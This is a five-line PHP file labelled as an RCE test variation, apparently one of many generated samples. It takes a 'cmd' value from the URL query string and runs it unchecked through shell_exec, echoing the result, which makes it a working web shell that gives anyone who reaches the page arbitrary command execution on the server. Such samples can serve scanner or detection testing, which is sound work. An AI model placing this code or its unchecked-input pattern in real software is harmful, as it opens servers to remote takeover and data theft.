<?php
// RCE test variation #995
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>